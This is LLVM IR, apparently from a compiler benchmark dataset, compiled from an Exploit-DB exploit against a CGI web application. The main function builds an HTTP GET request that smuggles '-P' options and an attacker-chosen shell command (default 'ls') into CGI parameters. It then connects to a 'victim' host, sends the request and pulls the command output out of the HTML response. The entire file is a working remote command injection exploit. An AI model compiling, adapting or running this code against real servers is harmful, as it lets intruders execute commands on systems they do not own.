; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_1194.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_1194.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i64 }

@.str = private unnamed_addr constant [5 x i8] c"?-P \00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c" ls\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"?program=-P \00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"?section=-P\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"&topic=w\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"# crafting buffer string ... \00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"%20\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"(done)\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [26 x i8] c"# error creating socket.\0A\00", align 1
@.str.10 = private unnamed_addr constant [43 x i8] c"# cant resolve the specified hostname: %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"# connecting to victim... \00", align 1
@.str.12 = private unnamed_addr constant [29 x i8] c"(error)\0A# check again %s:%d\0A\00", align 1
@.str.13 = private unnamed_addr constant [36 x i8] c"(done)\0A# sending crafted string... \00", align 1
@.str.14 = private unnamed_addr constant [45 x i8] c"\0A# error while sending the crafted string.!\0A\00", align 1
@.str.15 = private unnamed_addr constant [35 x i8] c"(done)\0A# waiting for our call ...\0A\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.17 = private unnamed_addr constant [5 x i8] c"<hr>\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"<A\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"<pre>\00", align 1
@.str.20 = private unnamed_addr constant [4 x i8] c"pre\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"PRE\00", align 1
@.str.22 = private unnamed_addr constant [33 x i8] c"# Bad response from the server.\0A\00", align 1
@.str.23 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [50000 x i8], align 16
  %14 = alloca [2000 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %9, align 4
  %15 = bitcast [2000 x i8]* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %15, i8 0, i64 2000, i1 false)
  %16 = bitcast i8* %15 to [2000 x i8]*
  %17 = getelementptr inbounds [2000 x i8], [2000 x i8]* %16, i32 0, i32 0
  store i8 71, i8* %17, align 16
  %18 = getelementptr inbounds [2000 x i8], [2000 x i8]* %16, i32 0, i32 1
  store i8 69, i8* %18, align 1
  %19 = getelementptr inbounds [2000 x i8], [2000 x i8]* %16, i32 0, i32 2
  store i8 84, i8* %19, align 2
  %20 = getelementptr inbounds [2000 x i8], [2000 x i8]* %16, i32 0, i32 3
  store i8 32, i8* %20, align 1
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 6
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @usage(i8* %26)
  br label %28

28:                                               ; preds = %23, %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 5
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %34, label %51

34:                                               ; preds = %28
  %35 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %36 = call i32 @memset(i8* %35, i32 0, i32 50000)
  %37 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 3
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcat(i8* %37, i8* %40)
  %42 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %43 = call i32 @strcat(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %44 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcat(i8* %44, i8* %47)
  %49 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %50 = call i32 @strcat(i8* %49, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  br label %104

51:                                               ; preds = %28
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 5
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @atoi(i8* %54)
  %56 = icmp eq i32 %55, 1
  br i1 %56, label %57, label %74

57:                                               ; preds = %51
  %58 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i32 0, i32 50000)
  %60 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 3
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @strcat(i8* %60, i8* %63)
  %65 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %66 = call i32 @strcat(i8* %65, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %67 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 2
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @strcat(i8* %67, i8* %70)
  %72 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %73 = call i32 @strcat(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  br label %103

74:                                               ; preds = %51
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 5
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @atoi(i8* %77)
  %79 = icmp eq i32 %78, 2
  br i1 %79, label %80, label %97

80:                                               ; preds = %74
  %81 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %82 = call i32 @memset(i8* %81, i32 0, i32 50000)
  %83 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 3
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcat(i8* %83, i8* %86)
  %88 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %89 = call i32 @strcat(i8* %88, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  %90 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 2
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @strcat(i8* %90, i8* %93)
  %95 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %96 = call i32 @strcat(i8* %95, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  br label %102

97:                                               ; preds = %74
  %98 = load i8**, i8*** %5, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 0
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 @usage(i8* %100)
  br label %102

102:                                              ; preds = %97, %80
  br label %103

103:                                              ; preds = %102, %57
  br label %104

104:                                              ; preds = %103, %34
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  br label %106

106:                                              ; preds = %134, %104
  %107 = load i32, i32* %7, align 4
  %108 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %109 = call i32 @strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %137

111:                                              ; preds = %106
  %112 = load i32, i32* %7, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 32
  br i1 %117, label %118, label %123

118:                                              ; preds = %111
  %119 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %120 = call i32 @strcat(i8* %119, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %121 = load i32, i32* %8, align 4
  %122 = add nsw i32 %121, 3
  store i32 %122, i32* %8, align 4
  br label %133

123:                                              ; preds = %111
  %124 = load i32, i32* %7, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 %129
  store i8 %127, i8* %130, align 1
  %131 = load i32, i32* %8, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %8, align 4
  br label %133

133:                                              ; preds = %123, %118
  br label %134

134:                                              ; preds = %133
  %135 = load i32, i32* %7, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %7, align 4
  br label %106

137:                                              ; preds = %106
  %138 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %139 = call i32 @strcat(i8* %138, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %141 = load i32, i32* @AF_INET, align 4
  %142 = load i32, i32* @SOCK_STREAM, align 4
  %143 = call i32 @socket(i32 %141, i32 %142, i32 0)
  store i32 %143, i32* %6, align 4
  %144 = load i32, i32* %6, align 4
  %145 = icmp slt i32 %144, 0
  br i1 %145, label %146, label %148

146:                                              ; preds = %137
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  store i32 %147, i32* %3, align 4
  br label %383

148:                                              ; preds = %137
  %149 = load i8**, i8*** %5, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 1
  %151 = load i8*, i8** %150, align 8
  %152 = call %struct.hostent* @gethostbyname(i8* %151)
  store %struct.hostent* %152, %struct.hostent** %11, align 8
  %153 = load %struct.hostent*, %struct.hostent** %11, align 8
  %154 = icmp eq %struct.hostent* %153, null
  br i1 %154, label %155, label %160

155:                                              ; preds = %148
  %156 = load i8**, i8*** %5, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 1
  %158 = load i8*, i8** %157, align 8
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.10, i64 0, i64 0), i8* %158)
  store i32 %159, i32* %3, align 4
  br label %383

160:                                              ; preds = %148
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0))
  br label %162

162:                                              ; preds = %160
  %163 = load i32, i32* @AF_INET, align 4
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %163, i32* %164, align 4
  %165 = load i8**, i8*** %5, align 8
  %166 = getelementptr inbounds i8*, i8** %165, i64 4
  %167 = load i8*, i8** %166, align 8
  %168 = call i32 @atoi(i8* %167)
  %169 = call i32 @htons(i32 %168)
  %170 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %169, i32* %170, align 4
  %171 = load %struct.hostent*, %struct.hostent** %11, align 8
  %172 = getelementptr inbounds %struct.hostent, %struct.hostent* %171, i32 0, i32 1
  %173 = load i64, i64* %172, align 8
  %174 = inttoptr i64 %173 to i8*
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %176 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %175, i32 0, i32 0
  %177 = bitcast i32* %176 to i8*
  %178 = load %struct.hostent*, %struct.hostent** %11, align 8
  %179 = getelementptr inbounds %struct.hostent, %struct.hostent* %178, i32 0, i32 0
  %180 = load i32, i32* %179, align 8
  %181 = call i32 @bcopy(i8* %174, i8* %177, i32 %180)
  %182 = load i32, i32* %6, align 4
  %183 = call i64 @connect(i32 %182, %struct.sockaddr_in* %10, i32 12)
  %184 = icmp slt i64 %183, 0
  br i1 %184, label %185, label %194

185:                                              ; preds = %162
  %186 = load i8**, i8*** %5, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 1
  %188 = load i8*, i8** %187, align 8
  %189 = load i8**, i8*** %5, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 3
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @atoi(i8* %191)
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.12, i64 0, i64 0), i8* %188, i32 %192)
  store i32 %193, i32* %3, align 4
  br label %383

194:                                              ; preds = %162
  %195 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.13, i64 0, i64 0))
  %196 = load i32, i32* %6, align 4
  %197 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %198 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %199 = call i32 @strlen(i8* %198)
  %200 = call i32 @send(i32 %196, i8* %197, i32 %199, i32 0)
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %204

202:                                              ; preds = %194
  %203 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.14, i64 0, i64 0))
  store i32 %203, i32* %3, align 4
  br label %383

204:                                              ; preds = %194
  %205 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.15, i64 0, i64 0))
  %206 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %207 = call i32 @memset(i8* %206, i32 0, i32 2000)
  %208 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %209 = call i32 @memset(i8* %208, i32 0, i32 50000)
  %210 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i64 0, i64 0))
  br label %211

211:                                              ; preds = %216, %204
  %212 = load i32, i32* %6, align 4
  %213 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %214 = call i64 @recv(i32 %212, i8* %213, i32 2000, i32 0)
  %215 = icmp sgt i64 %214, 0
  br i1 %215, label %216, label %220

216:                                              ; preds = %211
  %217 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %218 = getelementptr inbounds [2000 x i8], [2000 x i8]* %14, i64 0, i64 0
  %219 = call i32 @strcat(i8* %217, i8* %218)
  br label %211

220:                                              ; preds = %211
  %221 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  store i8* %221, i8** %12, align 8
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %222 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %223 = call i32 @strlen(i8* %222)
  store i32 %223, i32* %9, align 4
  %224 = load i8**, i8*** %5, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 5
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226)
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %274

229:                                              ; preds = %220
  br label %230

230:                                              ; preds = %240, %229
  %231 = load i8*, i8** %12, align 8
  %232 = call i64 @strncmp(i8* %231, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0), i32 4)
  %233 = icmp ne i64 %232, 0
  br i1 %233, label %234, label %238

234:                                              ; preds = %230
  %235 = load i32, i32* %7, align 4
  %236 = load i32, i32* %9, align 4
  %237 = icmp slt i32 %235, %236
  br label %238

238:                                              ; preds = %234, %230
  %239 = phi i1 [ false, %230 ], [ %237, %234 ]
  br i1 %239, label %240, label %245

240:                                              ; preds = %238
  %241 = load i8*, i8** %12, align 8
  %242 = getelementptr inbounds i8, i8* %241, i32 1
  store i8* %242, i8** %12, align 8
  %243 = load i32, i32* %7, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %7, align 4
  br label %230

245:                                              ; preds = %238
  %246 = load i8*, i8** %12, align 8
  %247 = getelementptr inbounds i8, i8* %246, i64 4
  store i8* %247, i8** %12, align 8
  br label %248

248:                                              ; preds = %262, %245
  %249 = load i8*, i8** %12, align 8
  %250 = call i64 @strncmp(i8* %249, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0), i32 4)
  %251 = icmp ne i64 %250, 0
  br i1 %251, label %252, label %260

252:                                              ; preds = %248
  %253 = load i8*, i8** %12, align 8
  %254 = call i64 @strncmp(i8* %253, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0), i32 2)
  %255 = icmp ne i64 %254, 0
  br i1 %255, label %256, label %260

256:                                              ; preds = %252
  %257 = load i32, i32* %8, align 4
  %258 = load i32, i32* %9, align 4
  %259 = icmp slt i32 %257, %258
  br label %260

260:                                              ; preds = %256, %252, %248
  %261 = phi i1 [ false, %252 ], [ false, %248 ], [ %259, %256 ]
  br i1 %261, label %262, label %267

262:                                              ; preds = %260
  %263 = load i32, i32* %8, align 4
  %264 = add nsw i32 %263, 1
  store i32 %264, i32* %8, align 4
  %265 = load i8*, i8** %12, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %12, align 8
  br label %248

267:                                              ; preds = %260
  %268 = load i8*, i8** %12, align 8
  store i8 0, i8* %268, align 1
  %269 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %270 = load i32, i32* %7, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds i8, i8* %269, i64 %271
  %273 = getelementptr inbounds i8, i8* %272, i64 4
  store i8* %273, i8** %12, align 8
  br label %370

274:                                              ; preds = %220
  %275 = load i8**, i8*** %5, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 5
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277)
  %279 = icmp eq i32 %278, 1
  br i1 %279, label %280, label %321

280:                                              ; preds = %274
  br label %281

281:                                              ; preds = %291, %280
  %282 = load i8*, i8** %12, align 8
  %283 = call i64 @strncmp(i8* %282, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i32 5)
  %284 = icmp ne i64 %283, 0
  br i1 %284, label %285, label %289

285:                                              ; preds = %281
  %286 = load i32, i32* %7, align 4
  %287 = load i32, i32* %9, align 4
  %288 = icmp slt i32 %286, %287
  br label %289

289:                                              ; preds = %285, %281
  %290 = phi i1 [ false, %281 ], [ %288, %285 ]
  br i1 %290, label %291, label %296

291:                                              ; preds = %289
  %292 = load i8*, i8** %12, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %12, align 8
  %294 = load i32, i32* %7, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %7, align 4
  br label %281

296:                                              ; preds = %289
  %297 = load i8*, i8** %12, align 8
  %298 = getelementptr inbounds i8, i8* %297, i64 4
  store i8* %298, i8** %12, align 8
  br label %299

299:                                              ; preds = %309, %296
  %300 = load i8*, i8** %12, align 8
  %301 = call i64 @strncmp(i8* %300, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.20, i64 0, i64 0), i32 3)
  %302 = icmp ne i64 %301, 0
  br i1 %302, label %303, label %307

303:                                              ; preds = %299
  %304 = load i32, i32* %8, align 4
  %305 = load i32, i32* %9, align 4
  %306 = icmp slt i32 %304, %305
  br label %307

307:                                              ; preds = %303, %299
  %308 = phi i1 [ false, %299 ], [ %306, %303 ]
  br i1 %308, label %309, label %314

309:                                              ; preds = %307
  %310 = load i32, i32* %8, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %8, align 4
  %312 = load i8*, i8** %12, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %12, align 8
  br label %299

314:                                              ; preds = %307
  %315 = load i8*, i8** %12, align 8
  store i8 0, i8* %315, align 1
  %316 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %317 = load i32, i32* %7, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds i8, i8* %316, i64 %318
  %320 = getelementptr inbounds i8, i8* %319, i64 6
  store i8* %320, i8** %12, align 8
  br label %369

321:                                              ; preds = %274
  %322 = load i8**, i8*** %5, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 5
  %324 = load i8*, i8** %323, align 8
  %325 = call i32 @atoi(i8* %324)
  %326 = icmp eq i32 %325, 2
  br i1 %326, label %327, label %368

327:                                              ; preds = %321
  br label %328

328:                                              ; preds = %338, %327
  %329 = load i8*, i8** %12, align 8
  %330 = call i64 @strncmp(i8* %329, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0), i32 3)
  %331 = icmp ne i64 %330, 0
  br i1 %331, label %332, label %336

332:                                              ; preds = %328
  %333 = load i32, i32* %7, align 4
  %334 = load i32, i32* %9, align 4
  %335 = icmp slt i32 %333, %334
  br label %336

336:                                              ; preds = %332, %328
  %337 = phi i1 [ false, %328 ], [ %335, %332 ]
  br i1 %337, label %338, label %343

338:                                              ; preds = %336
  %339 = load i8*, i8** %12, align 8
  %340 = getelementptr inbounds i8, i8* %339, i32 1
  store i8* %340, i8** %12, align 8
  %341 = load i32, i32* %7, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %7, align 4
  br label %328

343:                                              ; preds = %336
  %344 = load i8*, i8** %12, align 8
  %345 = getelementptr inbounds i8, i8* %344, i64 2
  store i8* %345, i8** %12, align 8
  br label %346

346:                                              ; preds = %356, %343
  %347 = load i8*, i8** %12, align 8
  %348 = call i64 @strncmp(i8* %347, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0), i32 3)
  %349 = icmp ne i64 %348, 0
  br i1 %349, label %350, label %354

350:                                              ; preds = %346
  %351 = load i32, i32* %8, align 4
  %352 = load i32, i32* %9, align 4
  %353 = icmp slt i32 %351, %352
  br label %354

354:                                              ; preds = %350, %346
  %355 = phi i1 [ false, %346 ], [ %353, %350 ]
  br i1 %355, label %356, label %361

356:                                              ; preds = %354
  %357 = load i32, i32* %8, align 4
  %358 = add nsw i32 %357, 1
  store i32 %358, i32* %8, align 4
  %359 = load i8*, i8** %12, align 8
  %360 = getelementptr inbounds i8, i8* %359, i32 1
  store i8* %360, i8** %12, align 8
  br label %346

361:                                              ; preds = %354
  %362 = load i8*, i8** %12, align 8
  store i8 0, i8* %362, align 1
  %363 = getelementptr inbounds [50000 x i8], [50000 x i8]* %13, i64 0, i64 0
  %364 = load i32, i32* %7, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds i8, i8* %363, i64 %365
  %367 = getelementptr inbounds i8, i8* %366, i64 2
  store i8* %367, i8** %12, align 8
  br label %368

368:                                              ; preds = %361, %321
  br label %369

369:                                              ; preds = %368, %314
  br label %370

370:                                              ; preds = %369, %267
  %371 = load i8*, i8** %12, align 8
  %372 = load i8, i8* %371, align 1
  %373 = sext i8 %372 to i32
  %374 = icmp eq i32 %373, 0
  br i1 %374, label %375, label %377

375:                                              ; preds = %370
  %376 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.22, i64 0, i64 0))
  store i32 %376, i32* %3, align 4
  br label %383

377:                                              ; preds = %370
  %378 = load i8*, i8** %12, align 8
  %379 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8* %378)
  %380 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i64 0, i64 0))
  %381 = load i32, i32* %6, align 4
  %382 = call i32 @close(i32 %381)
  store i32 0, i32* %3, align 4
  br label %383

383:                                              ; preds = %377, %375, %202, %185, %155, %146
  %384 = load i32, i32* %3, align 4
  ret i32 %384
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @bcopy(i8*, i8*, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr_in*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i64 @recv(i32, i8*, i32, i32) #2

declare dso_local i64 @strncmp(i8*, i8*, i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
